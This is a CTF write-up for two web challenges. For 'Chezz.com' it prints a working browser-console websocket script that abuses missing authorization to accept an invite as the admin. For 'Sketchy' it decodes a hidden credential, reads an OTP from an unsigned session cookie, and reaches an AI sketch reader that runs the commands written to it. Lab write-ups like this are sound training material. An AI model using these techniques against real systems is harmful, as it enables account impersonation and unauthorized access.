---
layout: post
title:  "Web Challenges"
date:   2026-08-17 19:25:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /thryve-ctf-2026-web/
---
* TOC
{:toc}

## Chezz.com

**Category**: web

**Description**: Dude, i really wanna play a match against the admin but he never accepts my invites :(

I go to the site:

![Alt text](/images/thryveweb1.png)

I tried to login with `admin:admin`. The site responded with "`This account is reserved.`" Then I logged in with `rookie7:password`:

![Alt text](/images/thryveweb2.png)

Once on this page I find endpoints in the source code:
```shell
curl "http://5697af69-11af-48cd-b7e4-381f1bfc9a62.inst.thryvectf.org/static/js/app.js" > chezz-app.js

cat chezz-app.js | grep "/api"  
response = await fetch('/api/me');  
const flagResponse = await fetch('/api/flag');  
response = await fetch('/api/settings');  
const response = await fetch('/api/settings', {  
const response = await fetch('/api/search', {  
const response = await fetch('/api/profile', {  
await fetch('/api/logout', {
```
I also read through `app.js` of course. 

I tried updating my user like this but it didnt do anything:
```http
POST /api/settings HTTP/1.1
Host: 5697af69-11af-48cd-b7e4-381f1bfc9a62.inst.thryvectf.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://5697af69-11af-48cd-b7e4-381f1bfc9a62.inst.thryvectf.org/
Content-Type: application/json
Content-Length: 58
Origin: http://5697af69-11af-48cd-b7e4-381f1bfc9a62.inst.thryvectf.org
DNT: 1
Connection: keep-alive
Cookie: session=eyJ1c2VyX2lkIjoidXNyX2JhZWY5ZTYzMzQ2MGJhMmYzOTQ5MzFjMzYzN2ZhNTA2MDcwOTk1NDFlOWVlMzQzNyJ9.an87eg.ep_Y7WndvzIKO4L6TBL7egMTyIs
Priority: u=0

{"display_name":"admin","title":"admin lol","avatar":"wp"}
```

I went to the `Challenge a player` section and searched for `admin`. I got a response containing the admins user id:
```http
HTTP/1.1 200 OK
Content-Length: 220
Content-Type: application/json
Date: Fri, 14 Aug 2026 16:02:06 GMT
Server: Werkzeug/3.1.8 Python/3.12.14
Vary: Cookie

{"ok":true,"profile":{"avatar":"bk","display_name":"Admin","id":"usr_308916525764bd6822598d756190dceea39cffa83f9b73ab","losses":6,"online":true,"rating":2870,"title":"Fair Play Moderator","username":"admin","wins":214}}
```

The sites websocket handler for `invite.accept` does not check that the websocket connections authenticated user matches the `accepting_user_id` you provide:
```js
function renderIncomingInvite(invite) {  
  clearEmptyInbox();  
  incrementActivity();  
  const box = document.createElement('div');  
  box.className = 'inbox-item';  
  box.innerHTML = `<strong>Challenge received</strong><p>@${escapeHtml(invite.from_username)} invited you to a match.</p>`;  
  
  const accept = document.createElement('button');  
  accept.className = 'small-btn';  
  accept.textContent = 'Accept';  
  accept.addEventListener('click', () => {  
	sendWs({  
	  type: 'invite.accept',  
	  request_id: requestId(),  
	  invite_id: invite.invite_id,  
	  accepting_user_id: invite.to_user_id  
	});  
  });  
  
  box.appendChild(accept);  
  inbox.prepend(box);  
}
```

So there is missing server side authorization/validation on the `invite.accept` action.. I sent this javascript in my browser console:
```js
const adminId = 'usr_308916525764bd6822598d756190dceea39cffa83f9b73ab';
const send = p => socket.send(JSON.stringify(p));
const rid = () => 'req_' + Math.random().toString(36).substr(2, 9);

socket.onmessage = function(e) {
  const p = JSON.parse(e.data);
  if (p.type === 'invite.created') {
    send({type:'invite.accept', request_id:rid(), invite_id:p.invite.invite_id, accepting_user_id:adminId});
  }
  if (p.type === 'flag.awarded') alert('Flag: ' + p.flag);
};

send({type:'invite.send', request_id:rid(), to_user_id:adminId});
```

I get the flag on the page:

![Alt text](/images/thryveweb3.png)

1. Log in as `rookie7`
2. search for `admin` to obtain the admins user ID
3. Send a websocket `invite.send` to the admin
4. The server creates an invite and broadcasts `invite.created` back to the sender
5. The script intercepts that event and immediately sends `invite.accept` with `accepting_user_id` set to the admins ID
6. The server accepts the invite as if the admin accepted it!

`Thryve{ec6dc09d-442d-4478-a5a1-0f46bc18aeae}`

___

## Sketchy

**Category**: web

**Description**: Woah i can draw!

I started by checking `robots.txt`:
```shell
curl http://ac604608-9ae4-423d-b2f6-8a0c882f510f.inst.thryvectf.org/robots.txt  
User-agent: *  
Disallow: /admin
```

On `/` I found this html comment:
```html
<!-- hktpu:GqD2lEki6WOe32GNBiD8EDrDfGMLJU -->
```

I put it into [cyberchef](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,19)&input=aGt0cHU6R3FEMmxFa2k2V09lMzJHTkJpRDhFRHJEZkdNTEpV) and decoded from ROT19:
```shell
admin:ZjW2eXdb6PHx32ZGUbW8XWkWyZFECN
```

On `/admin` I found this:
```html
<!-- c291cA== -->
```

It decoded to `soup` but was never used for anything:
```shell
echo "c291cA==" | base64 -d  
soup
```

I went back to `/admin` and logged in with the credentials `admin:ZjW2eXdb6PHx32ZGUbW8XWkWyZFECN`. Once I'm logged in I get redirected to `/otp`:
![[thryveweb6.png]]

I get a cookie like this:
```shell
eyJvdHAiOiIzMjE1IiwidXNlciI6ImFkbWluIn0.an9Nzw.1968laV_Yv0JfG1mjc5LSH9dQuc
```

It decodes to something like this:
```shell
{
  "otp": "3215",
  "user": "admin"
}
```

Once the one time password is bypassed I am on `/ai-reader`:

![Alt text](/images/thryveweb7.png)

It seems they added an AI component to the sketchpad.

I tested it and eventually I found it would simply execute the commands I wrote out:

![Alt text](/images/thryveweb4.png)

Cool!!

Get the flag:

![Alt text](/images/thryveweb5.png)

`Thryve{396fad83-4565-4464-8d19-a3411135fc9a}`
